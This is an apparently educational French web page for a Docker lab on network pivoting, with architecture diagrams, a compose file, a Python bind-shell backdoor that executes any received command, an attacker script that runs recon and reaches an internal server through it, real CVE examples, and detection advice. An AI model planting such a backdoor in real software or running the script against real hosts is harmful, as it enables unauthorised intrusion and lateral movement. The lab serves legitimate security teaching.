---
layout: default
title: "Python.Network.Pivot"
description: "Laboratoire de Pivot Réseau avec Docker et Python"
generated_at: "2026-03-14 14:31:40"
last_update: "2026-03-14"
---

<div class="breadcrumb">
  <a href="/">Accueil</a> / <span>Python.Network.Pivot</span>
</div>

<div class="page-header">
  <h1>Python.Network.Pivot</h1>
  <div class="page-actions">
    <a href="qcm/" class="btn btn-secondary">QCM</a>
    <a href="https://github.com/venantvr-security/Python.Network.Pivot" class="btn btn-primary" target="_blank">GitHub</a>
  </div>
</div>

# Laboratoire de Pivot Réseau avec Docker et Python

> **AVERTISSEMENT** : Ce projet est **strictement éducatif**. L'utilisation de ces techniques sur des réseaux non autorisés est un délit pénal.

## Introduction : Qu'est-ce que le Pivot Réseau ?

Dans une infrastructure d'entreprise, les réseaux sont généralement **segmentés** : les serveurs critiques sont isolés dans des zones internes inaccessibles depuis Internet. Mais que se passe-t-il si un attaquant compromet une machine dans la DMZ ?

Le **pivot réseau** (ou "network pivoting") est une technique qui permet à un attaquant d'utiliser une machine compromise comme **relais** pour atteindre des réseaux normalement inaccessibles. C'est comme utiliser un tremplin pour sauter plus loin.

### Pourquoi ce laboratoire ?

Ce projet reproduit un environnement d'entreprise réaliste avec Docker, permettant de :

- **Comprendre** comment les attaquants se déplacent latéralement dans un réseau
- **Pratiquer** les techniques de pivot sans Metasploit (pour vraiment comprendre les mécanismes)
- **Apprendre** à détecter et bloquer ce type d'attaque
- **Maîtriser** la programmation réseau en Python

### Ce que vous allez construire

Un laboratoire complet avec :
- 3 réseaux Docker isolés simulant Internet, une DMZ et un réseau interne
- 2 routeurs simulés avec IP forwarding
- Des scripts Python pour l'exploitation et le pivot


## Architecture du Laboratoire

Avant de plonger dans le code, visualisons l'infrastructure que nous allons créer. Cette architecture reproduit un scénario classique d'entreprise avec des zones de sécurité distinctes.

### Vue d'ensemble

Le diagramme ci-dessous montre les trois réseaux et les machines qui les composent. Remarquez que l'attaquant (en rouge) ne peut **pas** accéder directement au serveur interne (en vert) : il doit passer par la DMZ.

<div class="mermaid">
flowchart TB
    subgraph INTERNET["🌐 RÉSEAU INTERNET"]
        ATK["🔴 Attaquant"]
        ATK_note>"172.18.0.2<br/><i>Point de départ</i>"]
    end

    subgraph DMZ["🟡 DMZ"]
        V1["🎯 Victim1"]
        V1_note>"172.19.0.3<br/>:8000 / :4444<br/><i>Point d'entrée</i>"]
    end

    subgraph INTERNAL["🔒 RÉSEAU INTERNE"]
        V2["💎 Victim2"]
        V2_note>"172.20.0.3<br/>:8000<br/><i>Cible finale</i>"]
    end

    R1["🔀 Router1"]
    R1_note>"172.18.0.3 ↔ 172.19.0.2"]
    R2["🔀 Router2"]
    R2_note>"172.19.0.4 ↔ 172.20.0.2"]

    ATK <-->|"Réseau internet"| R1
    R1 <-->|"Réseau dmz"| V1
    V1 <-->|"Réseau dmz"| R2
    R2 <-->|"Réseau internal"| V2

    ATK -.->|"❌ Accès direct IMPOSSIBLE"| V2

    style ATK fill:#e74c3c,fill-opacity:0.15
    style V1 fill:#f39c12,fill-opacity:0.15
    style V2 fill:#2ecc71,fill-opacity:0.15
    style R1 fill:#9b59b6,fill-opacity:0.15
    style R2 fill:#9b59b6,fill-opacity:0.15
    style ATK_note fill:#e74c3c,fill-opacity:0.1
    style V1_note fill:#f39c12,fill-opacity:0.1
    style V2_note fill:#2ecc71,fill-opacity:0.1
    style R1_note fill:#9b59b6,fill-opacity:0.1
    style R2_note fill:#9b59b6,fill-opacity:0.1
    style INTERNET fill:#808080,fill-opacity:0.15
    style DMZ fill:#808080,fill-opacity:0.15
    style INTERNAL fill:#808080,fill-opacity:0.15
</div>

### Tableau récapitulatif des réseaux

| Réseau Docker | Rôle | Plage IP | Machines |
|---------------|------|----------|----------|
| `internet` | Zone externe | 172.18.0.0/16 | Attaquant, Router1 |
| `dmz` | Zone exposée | 172.19.0.0/16 | Router1, Victim1, Router2 |
| `internal` | Zone protégée | 172.20.0.0/16 | Router2, Victim2 |


## Déroulement de l'Attaque : Les 3 Phases

Maintenant que vous comprenez l'architecture, voyons comment un attaquant procède pour atteindre le serveur interne depuis Internet. L'attaque se déroule en trois phases distinctes.

<div class="mermaid">
sequenceDiagram
    autonumber
    participant À as 🔴 Attaquant<br/>(Internet)
    participant V1 as 🎯 Victim1<br/>(DMZ)
    participant V2 as 💎 Victim2<br/>(Interne)

    rect rgb(231, 76, 60, 0.2)
        Note over A,V1: PHASE 1 : Compromission de la DMZ
        A->>V1: Connexion au backdoor :4444
        V1-->>A: Shell obtenu sur Victim1
        A->>V1: Reconnaissance : ip addr, netstat...
        Note right of A: L'attaquant découvre que<br/>Victim1 a accès au réseau interne
    end

    rect rgb(241, 196, 15, 0.2)
        Note over V1: PHASE 2 : Configuration du pivot
        A->>V1: Lancer un proxy relay sur :5555
        V1->>V1: socket.bind(0.0.0.0:5555)
        Note right of V1: Victim1 devient un<br/>relais vers le réseau interne
    end

    rect rgb(46, 204, 113, 0.2)
        Note over A,V2: PHASE 3 : Accès au réseau interne
        A->>V1: "Exécute : curl 172.20.0.3:8000"
        V1->>V2: HTTP GET / (depuis la DMZ)
        V2-->>V1: "Secret Internal Server"
        V1-->>A: Résultat relayé à l'attaquant
        Note over A: 🎉 Objectif atteint !
    end
</div>

### Le point clé

À l'issue de la Phase 3, l'attaquant a réussi à **lire des données sur un serveur interne** alors qu'il n'avait initialement accès qu'à Internet. C'est tout le principe du pivot : utiliser une machine compromise comme relais.


## Mise en Place du Laboratoire

### Fichier docker-compose.yml

Ce fichier définit l'ensemble de l'infrastructure. Prenez le temps de lire les commentaires pour comprendre chaque élément.

```yaml
version: '3.8'

# Définition des trois réseaux isolés
networks:
  internet:
    driver: bridge
  dmz:
    driver: bridge
  internal:
    driver: bridge

services:
  # L'attaquant - connecté uniquement à Internet
  attacker:
    image: python:3.9-slim
    networks:
      - internet
    command: "bash"
    tty: true
    stdin_open: true

  # Routeur entre Internet et DMZ
  router1:
    image: ubuntu:20.04
    networks:
      - internet
      - dmz
    # CAP_NET_ADMIN permet de configurer le routage
    cap_add:
      - NET_ADMIN
    # Active le forwarding IP (transforme en routeur)
    command: "bash -c 'sysctl -w net.ipv4.ip_forward=1 && tail -f /dev/null'"
    tty: true

  # Serveur dans la DMZ (notre point d'entrée)
  victim1:
    image: python:3.9-slim
    networks:
      - dmz
    volumes:
      - ./victim1:/app
    working_dir: /app
    tty: true

  # Routeur entre DMZ et réseau interne
  router2:
    image: ubuntu:20.04
    networks:
      - dmz
      - internal
    cap_add:
      - NET_ADMIN
    command: "bash -c 'sysctl -w net.ipv4.ip_forward=1 && tail -f /dev/null'"
    tty: true

  # Serveur interne (notre cible finale)
  victim2:
    image: python:3.9-slim
    networks:
      - internal
    volumes:
      - ./victim2:/app
    working_dir: /app
    tty: true
```

### Démarrage du laboratoire

```bash
# Cloner le projet
git clone https://github.com/venantvr-security/Python.Network.Pivot
cd Python.Network.Pivot

# Démarrer tous les conteneurs
docker-compose up -d

# Vérifier que tout fonctionne
docker ps
```


## Les Scripts Python

### Le backdoor sur Victim1

Ce script simule une vulnérabilité exploitée dans la DMZ. En conditions réelles, cela pourrait être une faille dans une application web.

```python
# victim1/backdoor.py
import socket
import subprocess

def backdoor():
    """
    Backdoor simple qui écoute sur le port 4444
    et exécute les commandes reçues.
    """
    s = socket.socket()
    s.bind(("0.0.0.0", 4444))
    s.listen(1)
    print("[*] Backdoor en écoute sur :4444")

    conn, addr = s.accept()
    print(f"[+] Connexion reçue de {addr}")

    while True:
        # Recevoir une commande
        cmd = conn.recv(1024).decode().strip()

        if cmd.lower() == "exit":
            break

        # Exécuter et renvoyer le résultat
        result = subprocess.getoutput(cmd)
        conn.send(result.encode())

    conn.close()
    s.close()

if __name__ == "__main__":
    backdoor()
```

### Le script d'attaque avec pivot

Ce script, exécuté depuis la machine de l'attaquant, orchestre toute l'attaque.

```python
# attacker/attack.py
import socket
import time

def connect_backdoor(host, port):
    """Établit une connexion avec le backdoor"""
    s = socket.socket()
    s.connect((host, port))
    return s

def send_command(sock, cmd):
    """Envoie une commande et retourne le résultat"""
    sock.send(cmd.encode())
    return sock.recv(4096).decode()

# ═══════════════════════════════════════════════════════
# PHASE 1 : Compromission de Victim1 dans la DMZ
# ═══════════════════════════════════════════════════════
victim1_ip = "172.19.0.3"
print(f"[*] Connexion au backdoor de Victim1 ({victim1_ip})...")
shell = connect_backdoor(victim1_ip, 4444)

# Reconnaissance
print("[*] Reconnaissance...")
print(send_command(shell, "whoami"))
print(send_command(shell, "ip addr"))

# ═══════════════════════════════════════════════════════
# PHASE 2 : Configuration du pivot
# ═══════════════════════════════════════════════════════
print("[*] Configuration du proxy pivot sur Victim1...")
pivot_code = '''python3 -c "
import socket
# Code du proxy relay...
" &'''
send_command(shell, pivot_code)
time.sleep(2)

# ═══════════════════════════════════════════════════════
# PHASE 3 : Accès au réseau interne via le pivot
# ═══════════════════════════════════════════════════════
victim2_ip = "172.20.0.3"
print(f"[*] Accès à Victim2 ({victim2_ip}) via le pivot...")
result = send_command(shell, f"curl -s {victim2_ip}:8000")

print("\n" + "="*50)
print("🎉 RÉSULTAT DEPUIS LE RÉSEAU INTERNE :")
print("="*50)
print(result)
```


## Les Différentes Techniques de Pivot

Il existe plusieurs façons de réaliser un pivot réseau. Chacune a ses avantages selon le contexte.

<div class="mermaid">
flowchart LR
    subgraph Techniques["🔧 Techniques de Pivot"]
        T1["<b>Socket Relay</b><br/><i>Relais TCP simple</i>"]
        T2["<b>SSH Tunnel</b><br/><i>-L / -R / -D</i>"]
        T3["<b>SOCKS Proxy</b><br/><i>Proxy dynamique</i>"]
        T4["<b>Port Forwarding</b><br/><i>Redirection ciblée</i>"]
    end

    subgraph Outils["🛠️ Implémentation Python"]
        O1["socket<br/><i>Bibliothèque standard</i>"]
        O2["paramiko<br/><i>SSH en Python</i>"]
        O3["PySocks<br/><i>Client SOCKS</i>"]
        O4["subprocess<br/><i>Commandes système</i>"]
    end

    T1 --> O1
    T2 --> O2
    T3 --> O3
    T4 --> O4

    style T1 fill:#3498db,fill-opacity:0.15
    style T2 fill:#9b59b6,fill-opacity:0.15
    style T3 fill:#e74c3c,fill-opacity:0.15
    style T4 fill:#f39c12,fill-opacity:0.15
    style Outils fill:#808080,fill-opacity:0.15
    style Techniques fill:#808080,fill-opacity:0.15
</div>

| Technique | Quand l'utiliser | Complexité |
|-----------|------------------|------------|
| **Socket Relay** | Pivot simple, accès à un seul port | ⭐ Facile |
| **SSH Tunnel** | Machine compromise à SSH | ⭐⭐ Moyen |
| **SOCKS Proxy** | Accès à plusieurs services | ⭐⭐⭐ Avancé |
| **Port Forwarding** | Redirection permanente | ⭐⭐ Moyen |


## Pour Aller Plus Loin

Ce laboratoire n'est qu'une introduction. Pour approfondir :

- 📚 [Docker Networking](https://docs.docker.com/network/) - Comprendre les réseaux Docker
- 🐍 [Python Socket Programming](https://docs.python.org/3/library/socket.html) - Documentation officielle
- 🔐 [Paramiko](https://www.paramiko.org/) - Tunnels SSH en Python
- 🛡️ [Détection de pivot](https://attack.mitre.org/tactics/TA0008/) - MITRE ATT&CK Lateral Movement


## Exploits et Vulnérabilités Connues

Le pivot réseau exploite souvent des vulnérabilités dans les services exposés en DMZ ou des failles de configuration. Voici des exemples réels de CVE ayant permis ce type d'attaque :

- **CVE-2021-26084 (Atlassian Confluence)** : Injection OGNL permettant l'exécution de code à distance. Une fois un serveur Confluence compromis en DMZ, l'attaquant peut pivoter vers les bases de données internes et les services Active Directory.

- **CVE-2019-0708 (BlueKeep)** : Vulnérabilité RDP pré-authentification permettant RCE. Exploitée pour compromettre des serveurs Windows en DMZ puis pivoter vers le réseau interne via des tunnels RDP ou SMB.

- **CVE-2020-1472 (Zerologon)** : Faille dans Netlogon permettant l'élévation de privilèges vers Domain Admin. Souvent utilisée comme seconde étape après un pivot initial pour compromettre l'ensemble du domaine Active Directory.

- **CVE-2021-34527 (PrintNightmare)** : Vulnérabilité dans le spouleur d'impression Windows permettant RCE. Utilisée pour le mouvement latéral une fois dans le réseau interne.

- **CVE-2022-22965 (Spring4Shell)** : Vulnérabilité RCE dans Spring Framework. Les applications Spring déployées en DMZ ont été compromises pour établir des points de pivot vers les réseaux internes.


## Approfondissement Théorique

Le pivot réseau s'inscrit dans la tactique "Lateral Movement" (TA0008) du framework MITRE ATT&CK. Cette phase intervient après la compromission initiale et vise à étendre l'accès de l'attaquant au sein de l'infrastructure cible. La segmentation réseau, bien qu'essentielle, n'est pas une protection absolue : elle ne fait que ralentir un attaquant déterminé en l'obligeant à trouver des chemins alternatifs via les machines ayant accès à plusieurs segments.

Les techniques de pivot se classent en deux catégories : le tunneling (encapsulation du trafic dans un protocole autorisé) et le proxying (utilisation d'un intermédiaire pour relayer les connexions). Le tunneling SSH avec les options -L (local forward), -R (remote forward) et -D (dynamic SOCKS proxy) reste la technique la plus répandue grâce à sa flexibilité et son chiffrement natif. Les proxies SOCKS4/SOCKS5, implémentés par des outils comme Chisel ou proxychains, permettent de router n'importe quelle application TCP à travers la machine compromise.

La détection du pivot réseau repose sur plusieurs indicateurs : connexions sortantes inhabituelles depuis des serveurs (qui sont normalement des récepteurs), trafic SSH ou HTTP/HTTPS vers des destinations internes atypiques, augmentation du volume de données transitant par certaines machines, et création de processus réseau suspects (nc, socat, ssh avec options de forwarding). Les solutions EDR modernes et les systèmes de détection d'anomalies réseau (NTA/NDR) sont spécifiquement conçues pour identifier ces comportements. La microsegmentation Zero Trust représente l'évolution architecturale majeure pour contrer ces attaques en vérifiant chaque flux réseau indépendamment.


---

